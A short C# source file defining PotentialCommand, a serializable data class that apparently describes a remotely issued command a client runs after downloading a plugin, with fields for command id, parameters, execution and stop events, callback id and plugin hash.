using System;

namespace Orcus.Shared.DynamicCommands
{
    /// <summary>
    ///     Contains all information a client needs to execute a dynamic command. Potential because it needs some activation
    ///     energy (e. g. the download of the plugin file) in order to work
    /// </summary>
    [Serializable]
    public class PotentialCommand
    {
        /// <summary>
        ///     The guid of the static command
        /// </summary>
        public Guid CommandId { get; set; }

        /// <summary>
        ///     The parameter for the static command
        /// </summary>
        public byte[] Parameter { get; set; }

        /// <summary>
        ///     The execution event for this dynamic command
        /// </summary>
        public ExecutionEvent ExecutionEvent { get; set; }

        /// <summary>
        ///     The event when the command should stop executing. This has no effect on a normal StaticCommand but only on an
        ///     ActiveStaticCommand. The command won't stop automatically if this property is null
        /// </summary>
        public StopEvent StopEvent { get; set; }

        /// <summary>
        ///     The unique id for this command
        /// </summary>
        public int CallbackId { get; set; }

        /// <summary>
        ///     The hash of the plugin file
        /// </summary>
        public byte[] PluginHash { get; set; }

        /// <summary>
        ///     The resource id to request in order to download the plugin
        /// </summary>
        public int PluginResourceId { get; set; }
    }
}